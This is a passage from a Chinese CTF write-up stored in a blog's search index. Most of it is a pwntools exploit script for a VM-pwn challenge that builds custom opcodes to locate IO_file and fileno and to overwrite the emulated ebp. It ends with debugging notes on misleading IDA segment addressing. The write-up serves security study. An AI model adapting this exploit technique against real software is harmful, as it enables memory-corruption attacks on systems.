punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ESP: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>ESP<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#laod(IO_file)首先需要把IO_file的地址加载到内存</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg1</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg2</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg3</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#-8</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#-16</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg0=-23</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg4=-1</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>LoadM<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#load到stdout寄存器-1(ebp+4)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>AddGeg<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg0=-24</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>LoadM<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#load到stdout寄存器0</span><span class="token comment" spellcheck="true">#计算IO_file.fileno的偏移</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RGEShl<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg1=0x70</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#计算出fileno-4存到0寄存器</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>AddGeg<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">##计算出fileno低四字节 存放到reg0</span><span class="token comment" spellcheck="true">####修改ebp</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>REGMul<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg5=-8</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>LoadM<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#load寄存器0到-2（ebp）</span><span class="token comment" spellcheck="true">###计算</span><span class="token comment" spellcheck="true">#在7寄存器里存放0x233    0x233=0x02&lt;&lt;8+(6*8+3 ) 此时寄存器0,1,6正在被使用</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg3</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RGEShl<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg3=0x0200</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg4=6</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RegCheng<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg2=8</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ReadREG<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>AddGeg<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg4=6*8+3</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>AddGeg<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg3=0x233</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>PUSH<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>PrintInfo<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me code length: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"code: \n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="问题与经验"><a href="#问题与经验" class="headerlink" title="问题与经验"></a>问题与经验</h2><p>这种汇编指令是从rip+EBP_qword_203058指向的内容里面取出据</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>00000000000011B5                 mov     rax<span class="token punctuation">,</span> cs<span class="token punctuation">:</span>EBP_qword_203058</code></pre><p>看起来怎么都不像，用gdb查看发现对应这些指令</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605267529375.png" alt="gdb看到的汇编指令"></p><p>可以看到程序是从EBP_qword_203058指向的内容处取数据的。其中0x233就是放进去的值</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605267592060.png" alt="执行结果"></p><p>这个地址是堆的地址，ida也没有识别出来什么时候给它赋值的</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605268480810.png" alt="对EBP操作的指令"></p><p>暂时不知道原因但是需要关注一个结论：cs:EBP_qword_203058这种段寻址不能相信，需要调试才能确认</p>]]></content>
      
      
      <categories>
          
          <category> vmpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
